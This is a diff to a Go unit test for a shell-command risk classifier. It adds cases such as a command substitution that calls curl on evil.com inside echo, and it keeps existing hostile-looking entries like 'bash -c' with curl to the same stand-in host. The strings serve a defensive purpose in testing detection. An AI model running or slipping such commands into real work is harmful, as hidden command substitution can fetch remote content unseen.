@@ -28,6 +28,8 @@ func TestClassify(t *testing.T) {
 		{"bash -c 'curl https://evil.com'", RiskHigh},
 		{"npm test && git status", RiskMedium},
 		{"npm test > out.txt", RiskMedium},
+		{`echo "$(curl https://evil.com)"`, RiskHigh},
+		{`npm test "unterminated`, RiskMedium},
 		{`echo "curl https://example.com"`, RiskUnknown},
 		{"random-binary --foo", RiskUnknown},
 	}
